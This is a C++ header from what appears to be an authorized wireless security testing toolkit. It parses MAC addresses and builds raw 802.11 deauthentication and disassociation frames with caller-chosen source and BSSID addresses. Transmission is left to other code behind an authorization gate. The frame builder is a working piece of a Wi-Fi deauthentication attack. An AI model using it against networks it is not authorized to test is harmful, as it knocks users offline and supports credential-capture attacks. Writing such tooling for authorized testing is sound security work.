#pragma once

// Pure, zero-dependency IEEE 802.11 management-frame builders (Functional Core style).
//
// This header carries ZERO Arduino / ESP-IDF / OS / socket headers, so it is fully
// host-testable (see tests/core/test_dot11_frames.cpp). It only serializes bytes; it never
// transmits. The imperative shell that actually puts these bytes on the air
// (platforms/common/esp32_offensive.hpp via esp_wifi_80211_tx, or the Linux libpcap
// backend) is responsible for clearing the zd::sec authorization gate FIRST — this module
// has no notion of policy and must never be reachable except through that gate.
//
// Frames here are raw 802.11 (no radiotap header): esp_wifi_80211_tx() wants a bare MAC
// frame, whereas the Linux pcap path prepends its own 8-byte radiotap stub separately.

#include <cstddef>
#include <cstdint>

namespace zd {
namespace dot11 {

// A deauthentication or disassociation management frame is a fixed 24-byte MAC header plus a
// 2-byte reason code. No radiotap, no FCS (the radio appends the FCS in hardware).
constexpr std::size_t kMgmtDeauthFrameLen = 26u;

// Common 802.11 reason codes (IEEE 802.11-2020 Table 9-49). Reason 7
// ("Class 3 frame received from nonassociated STA") is what aireplay-ng/mdk use by default.
enum class Reason : uint16_t {
    Unspecified = 1,
    ClassErr3FromNonAssoc = 7,
    DisassocLeaving = 8,
};

// Parse a textual MAC ("aa:bb:cc:dd:ee:ff", "aabbccddeeff", "AA-BB-..", mixed case) into 6
// raw octets. Returns true only when EXACTLY 12 hex nibbles are present; separators and
// surrounding whitespace are ignored. Pure and total (never throws, never reads out of
// bounds). Mirrors zd::sec::isValidMac's acceptance so a value that cleared the auth-gate's
// validation also parses here.
inline bool parseMac(const char* text, uint8_t out[6]) {
    if (text == nullptr) {
        return false;
    }
    uint8_t nibbles[12];
    std::size_t n = 0;
    for (const char* p = text; *p != '\0'; ++p) {
        const unsigned char c = static_cast<unsigned char>(*p);
        int v;
        if (c >= '0' && c <= '9') {
            v = c - '0';
        } else if (c >= 'a' && c <= 'f') {
            v = c - 'a' + 10;
        } else if (c >= 'A' && c <= 'F') {
            v = c - 'A' + 10;
        } else if (c == ':' || c == '-' || c == ' ' || c == '\t' || c == '\r' || c == '\n') {
            continue;  // separator / whitespace
        } else {
            return false;  // stray non-hex character (e.g. an injected CLI flag)
        }
        if (n >= 12) {
            return false;  // too many hex digits
        }
        nibbles[n++] = static_cast<uint8_t>(v);
    }
    if (n != 12) {
        return false;  // too few hex digits
    }
    for (std::size_t i = 0; i < 6; ++i) {
        out[i] = static_cast<uint8_t>((nibbles[i * 2] << 4) | nibbles[i * 2 + 1]);
    }
    return true;
}

// True if `mac` is the all-ones broadcast address ff:ff:ff:ff:ff:ff.
inline bool isBroadcast(const uint8_t mac[6]) {
    for (std::size_t i = 0; i < 6; ++i) {
        if (mac[i] != 0xFF) {
            return false;
        }
    }
    return true;
}

// Serialize one raw 802.11 deauth (or disassoc) management frame into `out`, which MUST have
// room for kMgmtDeauthFrameLen (26) bytes. Returns the number of bytes written (always 26).
//
//   addr1 = destination (the station being kicked, or ff:ff:.. for broadcast)
//   addr2 = source      (conventionally the AP/BSSID)
//   addr3 = BSSID
//
// `disassoc=false` builds subtype 12 (deauthentication); `true` builds subtype 10
// (disassociation). The gate upstream decides whether this is permitted; this is bytes only.
inline std::size_t buildDeauthFrame(uint8_t* out,
                                    const uint8_t addr1[6],
                                    const uint8_t addr2[6],
                                    const uint8_t addr3[6],
                                    Reason reason = Reason::ClassErr3FromNonAssoc,
                                    bool disassoc = false) {
    std::size_t n = 0;
    // Frame Control: type=management (00), subtype=deauth(1100)/disassoc(1010), flags=0.
    out[n++] = disassoc ? 0xA0 : 0xC0;
    out[n++] = 0x00;
    // Duration/ID.
    out[n++] = 0x00;
    out[n++] = 0x00;
    // Address 1 (DA), Address 2 (SA), Address 3 (BSSID).
    for (std::size_t i = 0; i < 6; ++i) out[n++] = addr1[i];
    for (std::size_t i = 0; i < 6; ++i) out[n++] = addr2[i];
    for (std::size_t i = 0; i < 6; ++i) out[n++] = addr3[i];
    // Sequence Control (hardware overwrites this).
    out[n++] = 0x00;
    out[n++] = 0x00;
    // Fixed-length reason-code field (little-endian).
    const uint16_t r = static_cast<uint16_t>(reason);
    out[n++] = static_cast<uint8_t>(r & 0xFF);
    out[n++] = static_cast<uint8_t>((r >> 8) & 0xFF);
    return n;
}

}  // namespace dot11
}  // namespace zd
